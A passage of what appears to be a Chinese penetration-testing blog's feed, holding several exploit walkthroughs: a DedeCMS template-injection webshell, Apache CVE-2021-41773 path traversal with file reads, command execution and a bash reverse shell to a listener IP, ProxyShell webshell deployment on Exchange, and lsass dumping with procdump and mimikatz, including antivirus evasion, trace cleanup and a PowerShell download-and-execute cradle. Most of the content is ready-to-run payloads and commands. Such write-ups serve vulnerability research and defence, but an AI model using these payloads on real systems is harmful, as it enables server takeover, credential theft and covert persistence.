title="漏洞验证"></a>漏洞验证</h2><p>访问以下链接：http://目标IP/data/admin/ver.txt</p><p><img src="/post/1d114771/1.png"></p><p>访问后返回DedeCMS版本更新时间，对比DedeCMS系统补丁更新完整列表：</p><p><a href="http://www.dedecms.com/pl/">http://www.dedecms.com/pl/</a></p><p>可查看对应的版本。20210926（对应DedeCMS v5.7.8版）之后（包含该本版）的版本将不受该漏洞影响。</p><p>访问<a href="http://ip/plus/recommend.php%E5%B9%B6%E6%8A%93%E5%8C%85">http://IP/plus/recommend.php并抓包</a></p><p><img src="/post/1d114771/2.png"></p><p>赋值Referer为coldwater，查看写入的模板内容</p><p><img src="/post/1d114771/3.png"></p><p>现在我们将Referer替换为注入代码，当然我们如果直接写一些常见的危险函数是不行的，因为在dedetemplate.class.php中，存在CheckDisabledFunctions函数，CheckDisabledFunctions函数在WriteCache中被调用，会对内容进行一个检测。</p><p><img src="/post/1d114771/4.png"></p><p><img src="/post/1d114771/5.png"></p><p>但是assert不在这个黑名单里面，且对get和post请求中的字符没有过滤，我们可以利用assert或者call_user_func执行任意代码。</p><p><img src="/post/1d114771/6.png"></p><p>除此之外，也并没有对<code>&quot;&quot;</code>进行检测，在php中，<code>&quot;&quot;</code>中的字符串可以被解析为函数，此外对反引号``也没有检测</p><p><img src="/post/1d114771/7.png"></p><p><img src="/post/1d114771/8.png"></p><p>成功执行命令。</p><p>以下（非详尽的）路径可以到达该漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/plus/flink.php?dopost=save</span><br><span class="line">/plus/users_products.php?oid=1337</span><br><span class="line">/plus/download.php?aid=1337</span><br><span class="line">/plus/showphoto.php?aid=1337</span><br><span class="line">/plus/users-do.php?fmdo=sendMail</span><br><span class="line">/plus/posttocar.php?id=1337</span><br><span class="line">/plus/vote.php?dopost=view</span><br><span class="line">/plus/carbuyaction.php?do=clickout</span><br><span class="line">/plus/recommend.php</span><br></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>尝试往目标服务器写入一句话木马</p><p>构造如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /plus/recommend.php?c=&#x27;echo &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot;&gt;shell.php&#x27; HTTP/1.1</span><br><span class="line">Host: 192.168.3.238</span><br><span class="line">Referer: &lt;?php $b = `$c`;  echo &quot;&lt;pre&gt;$b&lt;/pre&gt;&quot;;/*</span><br></pre></td></tr></table></figure><p><img src="/post/1d114771/9.png"></p><p><img src="/post/1d114771/10.png"></p><p>写入shell失败</p><p>构造如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /plus/recommend.php?c=echo &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot;&gt;shell.php HTTP/1.1</span><br><span class="line">Host: 192.168.3.238</span><br><span class="line">Referer: &lt;?php $b = `$c`;  echo &quot;&lt;pre&gt;$b&lt;/pre&gt;&quot;;/*</span><br></pre></td></tr></table></figure><p><img src="/post/1d114771/11.png"></p><p>同样写入失败</p><p>执行系统命令<code>net user</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /plus/recommend.php?c=net user HTTP/1.1</span><br><span class="line">Host: 192.168.3.238</span><br><span class="line">Referer: &lt;?php $b = `$c`;  echo &quot;&lt;pre&gt;$b&lt;/pre&gt;&quot;;/*</span><br></pre></td></tr></table></figure><p><img src="/post/1d114771/12.png"></p><p>执行命令失败</p><p>猜测是执行的命令中包含空格，想办法bypass空格</p><p><strong>此处可以用<code>%09</code>代替空格，需要PHP环境</strong></p><p>构造如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /plus/recommend.php?c=echo%09123&gt;s.php HTTP/1.1</span><br><span class="line">Host: 192.168.3.238</span><br><span class="line">Referer: &lt;?php $b = `$c`;  echo &quot;&lt;pre&gt;$b&lt;/pre&gt;&quot;;/*</span><br></pre></td></tr></table></figure><p><img src="/post/1d114771/13.png"></p><p>写入一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /plus/recommend.php?c=echo%09&quot;&lt;?php%09@eval($_POST[cmd]);?&gt;&quot;&gt;shell.php HTTP/1.1</span><br><span class="line">Host: 192.168.3.238</span><br><span class="line">Referer: &lt;?php $b = `$c`;  echo &quot;&lt;pre&gt;$b&lt;/pre&gt;&quot;;/*</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure><p><img src="/post/1d114771/14.png"></p><p>成功写入shell.php</p><p>用蚁剑连接</p><p><img src="/post/1d114771/15.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/GSudZ7T8rl2yx5Tpkk6pHQ">https://mp.weixin.qq.com/s/GSudZ7T8rl2yx5Tpkk6pHQ</a></p><p><a href="https://xz.aliyun.com/t/10331">https://xz.aliyun.com/t/10331</a></p><p><a href="https://blog.csdn.net/xuu4561/article/details/120609960">https://blog.csdn.net/xuu4561/article/details/120609960</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;DedeCMS是国内专业的PHP网站内容管理系统-织梦内容管理系统，采用XML名字空间风格核心模板：模板全部使用文件形式保存，对用户设计模板</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-41773复现</title>
    <link href="http://lvpsectime.github.io/post/c52e013e.html"/>
    <id>http://lvpsectime.github.io/post/c52e013e.html</id>
    <published>2021-10-07T08:45:46.000Z</published>
    <updated>2021-11-24T14:01:53.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Apache HTTP Server 2.4.49 版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到 Web 目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache HTTP Server 2.4.49</span><br></pre></td></tr></table></figure><p>前置条件</p><p>穿越目录运行被访问。比如配置了 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p><strong>Dockerfile</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM vulhub/httpd:2.4.49</span><br><span class="line"></span><br><span class="line">RUN set -ex \</span><br><span class="line">    &amp;&amp; sed -i &quot;s|#LoadModule cgid_module modules/mod_cgid.so|LoadModule cgid_module modules/mod_cgid.so|g&quot; /usr/local/apache2/conf/httpd.conf \</span><br><span class="line">    &amp;&amp; sed -i &quot;s|#LoadModule cgi_module modules/mod_cgi.so|LoadModule cgi_module modules/mod_cgi.so|g&quot; /usr/local/apache2/conf/httpd.conf \</span><br><span class="line">    &amp;&amp; sed -i &quot;s|#Include conf/extra/httpd-autoindex.conf|Include conf/extra/httpd-autoindex.conf|g&quot; /usr/local/apache2/conf/httpd.conf \</span><br><span class="line">    &amp;&amp; cat /usr/local/apache2/conf/httpd.conf \</span><br><span class="line">        | tr &#x27;\n&#x27; &#x27;\r&#x27; \</span><br><span class="line">        | perl -pe &#x27;s|&lt;Directory /&gt;.*?&lt;/Directory&gt;|&lt;Directory /&gt;\n    AllowOverride none\n    Require all granted\n&lt;/Directory&gt;|isg&#x27; \</span><br><span class="line">        | tr &#x27;\r&#x27; &#x27;\n&#x27; \</span><br><span class="line">        | tee /tmp/httpd.conf \</span><br><span class="line">&amp;&amp; mv /tmp/httpd.conf /usr/local/apache2/conf/httpd.conf</span><br></pre></td></tr></table></figure><p>执行如下命令启动环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t cve-2021-41773 .</span><br><span class="line">docker run -d -p 80:80 5f453ed6f9a4</span><br></pre></td></tr></table></figure><p>进入容器修改Apache配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 5977a2464108 bash</span><br></pre></td></tr></table></figure><p>修改配置文件<code>httpd.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt install vim</span><br><span class="line">vim conf/httpd.conf</span><br><span class="line"></span><br><span class="line">内容如下：</span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p><img src="/post/c52e013e/image-20211124212009883.png" alt="image-20211124212009883"></p><p>重启容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker restart 5977a2464108</span><br></pre></td></tr></table></figure><p><img src="/post/c52e013e/image-20211124212225104.png" alt="image-20211124212225104"></p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --path-as-is http://10.108.2.145/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/post/c52e013e/image-20211124212543354.png" alt="image-20211124212543354"></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --data &quot;echo;id&quot; &#x27;http://10.108.2.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;  # Linux</span><br><span class="line">curl --data &quot;echo;id&quot; &quot;http://10.108.2.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&quot;  # Windows </span><br></pre></td></tr></table></figure><p><img src="/post/c52e013e/image-20211124212949876.png" alt="image-20211124212949876"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>开启 nc 监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure><p>echo 命令重定向将反弹 shell 的命令写入文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data &quot;echo;echo &#x27;bash -i &gt;&amp; /dev/tcp/10.108.2.152/7777 0&gt;&amp;1&#x27;&gt;&gt; /tmp/shell.sh&quot; &#x27;http://10.108.2.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span><br></pre></td></tr></table></figure><p>bash 反弹 shell 的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data &quot;echo;bash /tmp/shell.sh&quot; &#x27;http://10.108.2.145/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27;</span><br></pre></td></tr></table></figure><p><img src="/post/c52e013e/image-20211124213838984.png" alt="image-20211124213838984"></p><p><img src="/post/c52e013e/image-20211124213853252.png" alt="image-20211124213853252"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://www.hackdig.com/10/hack-503303.htm">http://www.hackdig.com/10/hack-503303.htm</a></p><p><a href="https://www.o2oxy.cn/3702.html">https://www.o2oxy.cn/3702.html</a></p><p><a href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Apache HTTP Server 2.4.49 版本对路径规范化所做的更改中存在一个路径穿越漏洞</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>获取Windows明文密码小技巧</title>
    <link href="http://lvpsectime.github.io/post/5d2c6350.html"/>
    <id>http://lvpsectime.github.io/post/5d2c6350.html</id>
    <published>2021-09-26T14:22:09.000Z</published>
    <updated>2021-09-26T15:35:22.598Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><p>利用Procdump+Mimikatz<strong>绕过杀软</strong>获取Windows明文密码。</p><p>工具准备：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">procdump:</span><br><span class="line">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</span><br><span class="line">mimikatz:</span><br><span class="line">https://github.com/gentilkiwi/mimikatz/</span><br></pre></td></tr></table></figure><p>把<code>procdump</code>上传到目标主机</p><ol><li>远程桌面连接，若是目标正在登录，容易暴露自己</li><li>与目标建立连接或映射</li></ol><p>第一种方法不再多说，详细说说第二种方法</p><p>首先我们需要能够访问别人的C$（通常只有管理员可以）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\target\c$ /user:domain\username password</span><br><span class="line">dir \\target\c$   # 查看目标C盘根目录</span><br></pre></td></tr></table></figure><p>上传文件到目标主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir \\target\c$\Temp</span><br><span class="line">dir \\target\c$\Temp</span><br><span class="line">copy c:\temp\procdump.exe \\target\c$\Temp  # 拷贝本地c:\temp\procdump.exe到目标C:\Temp</span><br><span class="line">copy c:\temp\procdump.bat \\target\c$\Temp</span><br></pre></td></tr></table></figure><p>procdump.bat的内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">C:\Temp\procdump.exe -accepteula -ma lsass.exe %COMPUTERNAME%_lsass.dmp</span><br></pre></td></tr></table></figure><p>这里一个技巧就是dump得到的文件名中有”计算机名”，这样可以让我们区分dump的文件来自哪台主机</p><p>procdump 是微软的官方工具，不会被杀，所以如果你的 mimikatz 不免杀，可以用 procdump 导出 lsass.dmp 后拖回本地抓取密码来规避杀软，也可以采用 <strong>pid</strong> 方式规避杀软</p><p><img src="https://img.sectime.top/imgs/2021/09/ff1f85cdad774081.png"></p><p>使用<code>net time</code>来获取远程主机上的时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net time \\target</span><br><span class="line">at \\target 13:00 C:\Temp\procdump.bat</span><br></pre></td></tr></table></figure><p>拷贝dump的文件，然后清理痕迹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir \\target\C$\Temp</span><br><span class="line">copy \\target\C$\Temp\*lsass.dmp C:\temp\output\</span><br><span class="line">rmdir /s \\target\C$\Temp</span><br></pre></td></tr></table></figure><p>将生成的<code>*lsass.dmp</code>拷贝到本地攻击机，使用<code>mimikatz</code>把结果导出到文本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; password.txt</span><br></pre></td></tr></table></figure><p>成功从内存中提取明文密码</p><h2 id="高版本抓取密码"><a href="#高版本抓取密码" class="headerlink" title="高版本抓取密码"></a>高版本抓取密码</h2><p>在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。</p><p>微软在 win7 之后就打了补丁 kb2871997，当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass 进程）不再保存明文口令。Mimikatz 将读不到密码明文。</p><p>但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）</p><p>以下是支持的系统:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Windows 7</span><br><span class="line">Windows 8</span><br><span class="line">Windows 8.1</span><br><span class="line">Windows Server 2008</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012R 2</span><br></pre></td></tr></table></figure><p><strong>开启Wdigest Auth</strong></p><p>cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><p>powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure><p>meterpreter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon</span><br></pre></td></tr></table></figure><p><strong>关闭 Wdigest Auth</strong></p><p>cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p>powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure><p>meterpreter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCreden</span><br></pre></td></tr></table></figure><p>在开启 Wdigest Auth 后，需要管理员重新登录才能抓明文密码。</p><p><strong>强制锁屏</strong></p><p>cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure><p>powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Function Lock-WorkStation</span><br><span class="line">&#123;</span><br><span class="line">$signature = @&quot;</span><br><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError = true)]</span><br><span class="line">public static extern bool LockWorkStation();</span><br><span class="line">&quot;@</span><br><span class="line">$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru</span><br><span class="line">$LockWorkStation::LockWorkStation() | Out-Null</span><br><span class="line">&#125;</span><br><span class="line">Lock-WorkStation</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://x.x.x.x/Lock-WorkStation.ps1&#x27;);&quot;</span><br></pre></td></tr></table></figure><p>重新读取，可读到明文密码。</p><h2 id="MSF-kiwi模块"><a href="#MSF-kiwi模块" class="headerlink" title="MSF kiwi模块"></a>MSF kiwi模块</h2><p>使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。</p><p>提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuidServer username: BYPASS-E97BA3FC\Administratormeterpreter &gt; getsystem ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>加载kiwi模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p>列举系统中的明文密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Procdump-Mimikatz&quot;&gt;&lt;a href=&quot;#Procdump-Mimikatz&quot; class=&quot;headerlink&quot; title=&quot;Procdump+Mimikatz&quot;&gt;&lt;/a&gt;Procdump+Mimikatz&lt;/h2&gt;&lt;p&gt;利用Procdump</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://lvpsectime.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="小技巧" scheme="http://lvpsectime.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>ProxyShell漏洞复现</title>
    <link href="http://lvpsectime.github.io/post/5b800888.html"/>
    <id>http://lvpsectime.github.io/post/5b800888.html</id>
    <published>2021-09-26T06:17:10.000Z</published>
    <updated>2021-09-26T08:00:21.832Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>国外安全研究人员在8月初公开了Microsoft Exchange多个高危漏洞（ProxyShell）利用的技术细节、PoC(概念验证代码)、EXP（漏洞利用代码）及利用视频。漏洞包括Exchange ACL绕过漏洞CVE-2021-34473、Exchange权限提升漏洞CVE-2021-34523和Exchange授权任意文件写入漏洞CVE-2021-31207）。</p><p>攻击者可通过组合使用上述漏洞在未经身份验证的情况下远程接管目标服务器。由于Exchange服务器一般承载着使用者单位人员信息的秘密，员工账号信息、邮件数据都在其中，一旦Exchange服务器被控制，将会造成严重后果。</p><p>由于国外安全研究人员将Exchange多个漏洞（ProxyShell）细节及部分PoC、EXP公开，意味着攻击者可根据这些技术细节披露的信息，在目标系统远程执行代码，使漏洞风险明显上升。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Exchange Server 2010</span><br><span class="line">Microsoft Exchange Server 2013</span><br><span class="line">Microsoft Exchange Server 2016</span><br><span class="line">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>ProxyShell是利用了Exchange服务器对于路径的不准确过滤导致的路径混淆生成的SSRF，进而使攻击者通过访问PowerShell端点。而在PowerShell端点可以利用Remote PowerShell来将邮件信息打包到外部文件，而攻击者可以通过构造恶意邮件内容，利用文件写入写出webshell，从而达成命令执行。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python &gt;= 3.8</span><br><span class="line">exchange的用户名</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下载工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">生成webshell：https://github.com/Ridter/proxyshell_payload</span><br><span class="line">利用：https://github.com/dmaasland/proxyshell-poc</span><br></pre></td></tr></table></figure><p>根据需要生成webshell，替换到proxyshell-poc中。默认情况下，生成的是一句话木马。</p><p><img src="https://img.sectime.top/imgs/2021/09/9484ca149ed1729b.png"></p><p>在proxyshell_payload.py中，修改末尾的webshell变量，将其替换为哥斯拉生成的aspx的webshell，需要注意的是经过测试CSharpDynamicPayload中的CSHAP_AES_BASE64，生成的webshell，需要将其中所有的Session替换成Application。</p><p>运行proxyshell_payload.py，将encode之后的内容，复制到<code>proxyshell_rce.py</code>的 314 行：</p><p><img src="https://img.sectime.top/imgs/2021/09/f51af1455550498d.png"></p><p>运行<code>proxyshell_rce.py</code>，获取exchange的 powershell 管理shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3.8 proxyshell_rce.py -u https://10.10.10.150 -e exchange@god.local</span><br><span class="line"># -u excahnge的地址</span><br><span class="line"># -e exchange的用户名</span><br></pre></td></tr></table></figure><p><img src="https://img.sectime.top/imgs/2021/09/ea3ad8256c1ed7e0.png"></p><p>清理邮件导出请求(如果报错，多执行几次脚本即可)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-MailboxExportRequest</span><br><span class="line">Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false</span><br></pre></td></tr></table></figure><p><img src="https://img.sectime.top/imgs/2021/09/4b15881da1e169cf.png"></p><p>执行<code>dropshell</code>，即可写入webshell，返回webshell的地址，连接密码：cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dropshell </span><br></pre></td></tr></table></figure><p><img src="https://img.sectime.top/imgs/2021/09/20b39933c5dd901e.png"></p><p>使用菜刀连接shell</p><p><img src="https://img.sectime.top/imgs/2021/09/7dd9da649b4c8581.png"></p><p>查看权限是system</p><p><img src="https://img.sectime.top/imgs/2021/09/0a79122357ef06f4.png"></p><p>Proxyshell_rce可以根据自己的需要修改生成shell的路径，只需要修改225行和 236行的两行内容，将其对应。</p><p>默认上传路径：C:\inetpub\wwwroot\aspnet_client</p><p><img src="https://img.sectime.top/imgs/2021/09/bf5f492edbd9044b.png"></p>]]></content>
    
    
      
      
